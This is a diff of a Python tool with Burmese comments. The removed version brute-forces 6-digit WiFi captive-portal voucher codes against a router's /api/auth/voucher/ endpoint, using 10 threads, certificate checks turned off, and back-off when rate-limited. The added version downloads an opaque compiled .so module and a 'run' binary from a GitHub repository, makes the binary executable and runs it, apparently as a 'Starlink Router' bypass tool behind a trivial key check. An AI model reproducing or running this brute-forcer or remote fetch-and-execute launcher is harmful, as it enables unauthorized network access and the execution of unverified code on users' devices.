@@ -1,130 +1,94 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-import requests
-import re
-import urllib3
-import time
-import threading
-import random
 import os
-import hashlib
-from urllib.parse import urlparse, parse_qs
+import sys
+import time
+import subprocess
 
-# SSL Warning ပိတ်ခြင်း
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# ၁။ လိုအပ်သောဖိုင်များ ဒေါင်းလုဒ်ဆွဲခြင်း
+def setup_files():
+    files = {
+        "ruijiedemo.so": "https://raw.githubusercontent.com/Haruto000x/STARLINK-ROUTER/main/ruijiedemo.cpython-313-aarch64-linux-android.so",
+        "run": "https://raw.githubusercontent.com/Haruto000x/STARLINK-ROUTER/main/run"
+    }
+    
+    for filename, url in files.items():
+        if not os.path.exists(filename):
+            print(f"[*] {filename} ကို ရှာမတွေ့ပါ... ဒေါင်းလုဒ်ဆွဲနေသည်...")
+            try:
+                subprocess.run(["curl", "-L", "-o", filename, url], check=True, capture_output=True)
+                print(f"[+] {filename} ရယူပြီးပါပြီ။")
+                if filename == "run":
+                    os.chmod(filename, 0o755)
+            except Exception as e:
+                print(f"[!] ဒေါင်းလုဒ်ဆွဲခြင်း မအောင်မြင်ပါ: {e}")
 
-# ===============================
-# UI COLORS
-# ===============================
-RED, GREEN, CYAN, YELLOW, MAGENTA, WHITE, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[97m", "\033[0m"
+# ၂။ Key စစ်ဆေးခြင်း Logic
+def verify_key():
+    key_file = "key.txt"
+    if not os.path.exists(key_file):
+        with open(key_file, "w") as f:
+            f.write("FREE-KEY-123") # Default key တစ်ခု ထည့်ပေးထားမယ်
+        print("[!] key.txt အသစ်ဆောက်ပေးထားပါသည်။ ကျေးဇူးပြု၍ Key ထည့်ပါ။")
+        return False
 
-# ===============================
-# CONFIGURATION
-# ===============================
-GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
-KEY_FILE = os.path.expanduser("~/.moe_yu_key")
+    with open(key_file, "r") as f:
+        stored_key = f.read().strip()
+    
+    if len(stored_key) < 5: # Key က အနည်းဆုံး ၅ လုံးရှိရမယ်လို့ သတ်မှတ်ခြင်း
+        print("[!] Key မမှန်ကန်ပါ။ (key.txt ကို စစ်ဆေးပါ)")
+        return False
+    
+    print(f"[✔] Key အတည်ပြုပြီးပါပြီ: {stored_key}")
+    return True
 
-def get_device_key():
-    if os.path.exists(KEY_FILE):
-        with open(KEY_FILE, 'r') as f: return f.read().strip()
-    key = hashlib.md5(os.urandom(32)).hexdigest()[:16]
-    with open(KEY_FILE, 'w') as f: f.write(key)
-    return key
-
-def check_license():
-    my_key = get_device_key()
-    print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
-    print(f"║        MOE YU VOUCHER SCANNER (TURBO v4)         ║")
-    print(f"╚══════════════════════════════════════════════════╝{RESET}")
-    print(f"{WHITE}[*] Device Key: {GREEN}{my_key}{RESET}")
+# ၃။ Tool ကို စတင်ခြင်း
+def launch_tool():
+    print("\n[+] Starlink Router Tool ကို စတင်နေပါပြီ...")
+    time.sleep(1.5)
+    
     try:
-        # အင်တာနက်ရှိမှ Key စစ်မည်
-        res = requests.get(GITHUB_KEY_URL, timeout=10).text
-        if my_key in res:
-            print(f"{GREEN}[✓] LICENSE VERIFIED!{RESET}")
-            return True
+        # .so ဖိုင်ကို import လုပ်ခြင်း
+        import ruijiedemo
+        
+        # *** အရေးကြီးဆုံးနေရာ ***
+        # ruijiedemo ထဲမှာပါတဲ့ run ဖို့ function ကို ဒီမှာ ခေါ်ရပါမယ်
+        # သင့်ရဲ့ .so ဖိုင်ထဲက function နာမည်ကို သိရင် အောက်က line မှာ ပြင်လိုက်ပါ
+        if hasattr(ruijiedemo, 'main'):
+            ruijiedemo.main()
+        elif hasattr(ruijiedemo, 'start'):
+            ruijiedemo.start()
         else:
-            print(f"{RED}[✗] ACCESS DENIED - Please add your key to GitHub{RESET}")
-            return False
-    except:
-        # အင်တာနက်မရှိလျှင်လည်း စမ်းသပ်နိုင်ရန် (Offline Bypass)
-        print(f"{YELLOW}[!] Connection timeout, bypassing license check...{RESET}")
-        return True
+            # function နာမည် တန်းသိရင် ဒီလို ခေါ်ပါ
+            # ruijiedemo.အခုဒီမှာနာမည်ရေး()
+            print("[!] .so ဖိုင်ထဲက Main Function ကို ရှာမတွေ့ပါ။")
+            
+    except ImportError:
+        print("[!] Error: Python 3.13 aarch64 (Android) မဟုတ်လို့ run လို့မရပါ။")
+    except Exception as e:
+        print(f"[!] တစ်စုံတစ်ရာ မှားယွင်းနေပါသည်: {e}")
 
-# ===============================
-# SCANNER ENGINE
-# ===============================
-FOUND_EVENT = threading.Event()
-SUCCESS_CODE = ""
-
-def turbo_scanner(api_url, sid, thread_id):
-    global SUCCESS_CODE
-    session = requests.Session()
-    while not FOUND_EVENT.is_set():
-        # ဂဏန်း ၆ လုံး ထုတ်ခြင်း
-        code = f"{random.randint(0, 999999):06d}"
-        payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
-        try:
-            r = session.post(api_url, json=payload, timeout=3, verify=False)
-            if r.status_code == 200:
-                res_data = r.json()
-                if res_data.get('success'):
-                    SUCCESS_CODE = code
-                    FOUND_EVENT.set()
-                    print(f"\n\n{GREEN}[✓✓✓] SUCCESS! VOUCHER FOUND: {code}{RESET}")
-                    with open("found_vouchers.txt", "a") as f:
-                        f.write(f"Voucher: {code} | Date: {time.ctime()}\n")
-                    break
-                else:
-                    # အလုပ်လုပ်နေကြောင်း ပြသရန်
-                    print(f"{WHITE}T-{thread_id} | Testing: {YELLOW}{code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
-            elif r.status_code == 403:
-                # Router က ခေတ္တပိတ်လျှင် ၁၀ စက္ကန့်နားမည်
-                time.sleep(10)
-        except:
-            pass
-        # Turbo Speed ဖြစ်၍ delay မပါပါ (Block ခံရလျှင် 0.01 ထည့်ပါ)
-
+# ၄။ ပင်မ လုပ်ဆောင်ချက်
 def main():
-    if not check_license(): return
-    
-    print(f"\n{CYAN}[*] WiFi တစ်ခုတည်းကိုပဲ ချိတ်ထားပါ (VPN/Data ပိတ်ပါ)...{RESET}")
-    url_input = input(f"{YELLOW}[?] Browser က URL ကို ဒီမှာထည့်ပါ: {RESET}").strip()
-    
-    # URL မှ sessionId ကို ခွဲထုတ်ခြင်း
-    try:
-        sid = parse_qs(urlparse(url_input).query).get('sessionId', [None])[0]
-        if not sid:
-            # URL ထဲမှာ မတွေ့ရင် တိုက်ရိုက် ရိုက်ခိုင်းမည်
-            sid = input(f"{RED}[!] SID မတွေ့ပါ။ sessionId ကို လက်ဖြင့်ရိုက်ထည့်ပါ: {RESET}").strip()
-    except:
-        sid = None
-
-    if sid:
-        parsed = urlparse(url_input)
-        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
-        print(f"{GREEN}[✓] Target API: {api_url}{RESET}")
-        print(f"{MAGENTA}[*] Turbo Scanning (10 Threads) Started...{RESET}\n")
+    while True: # ပရိုဂရမ် တန်းမပိတ်သွားအောင် loop ပတ်ထားမယ်
+        os.system("clear")
+        print("="*45)
+        print("      STARLINK ROUTER AUTO SYSTEM (2026)      ")
+        print("="*45)
         
-        # Thread ၁၀ ခုဖြင့် စတင်ခြင်း
-        threads = []
-        for i in range(1, 11):
-            t = threading.Thread(target=turbo_scanner, args=(api_url, sid, i))
-            t.daemon = True
-            threads.append(t)
-            t.start()
+        setup_files()
         
-        # တွေ့သည့်အထိ စောင့်ဆိုင်းခြင်း
-        while not FOUND_EVENT.is_set():
-            time.sleep(1)
-        
-        print(f"\n{CYAN}[*] Done! Code ကို 'found_vouchers.txt' မှာ သိမ်းထားပါတယ်ဗျ။{RESET}")
-    else:
-        print(f"{RED}[✗] sessionId ရှာမတွေ့ပါ။ URL အမှန်ကို ပြန်ကူးပေးပါ။{RESET}")
+        if verify_key():
+            launch_tool()
+            break # အောင်မြင်ရင် loop က ထွက်မယ်
+        else:
+            print("\n[၁] နောက်တစ်ကြိမ် ကြိုးစားမည်")
+            print("[၂] ထွက်မည်")
+            choice = input("\nရွေးချယ်ရန်: ")
+            if choice != '1':
+                sys.exit()
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{RED}[!] Scanner Stopped by User.{RESET}")
+        print("\n[!] ပိတ်လိုက်ပါပြီ။")
+        sys.exit()
